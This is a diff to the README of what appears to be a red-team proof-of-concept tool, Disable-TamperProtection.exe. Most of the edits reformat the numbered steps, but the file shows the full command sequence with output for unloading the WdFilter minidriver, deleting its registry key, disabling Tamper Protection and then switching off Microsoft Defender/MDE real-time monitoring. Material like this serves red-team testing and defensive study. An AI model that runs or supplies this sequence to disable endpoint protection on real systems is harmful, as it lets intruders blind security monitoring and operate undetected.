@@ -206,7 +206,8 @@ Sequential Usage: 1 --> 2 --> 3
 
 An example, to use this POC is as follows:
 
-1. Unload WdFilter:
+1) Unload WdFilter:
+
 ```
 C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key Value: (null)
@@ -228,7 +229,8 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
 ```
 
-2. Disable Tamper Protection:
+2) Disable Tamper Protection:
+
 ```
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
 [+] WdFilter Altitude Registry key has been successfully deleted.
@@ -238,7 +240,8 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
 [+] Use option '3' to finally Disable AV/MDE.
 ```
 
-3. Disable Defender / MDE:
+3) Disable Defender / MDE:
+
 ```
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
 [+] WdFilter Altitude Registry key has been successfully deleted.
@@ -254,8 +257,8 @@ The POC manages to semi-permanently disable Real time monitoring (gray out) afte
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)
 
+4) Optionally reinstate the WdFilter minidriver, TamperProtection and Defender Settings (RealTimeMonitoring) using option 4 as follows:
 
-4. Optionally reinstate the WdFilter minidriver, TamperProtection and Defender Settings (RealTimeMonitoring) using option 4 as follows:
 ```
 # Restart the computer to restore settings successfully
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 4
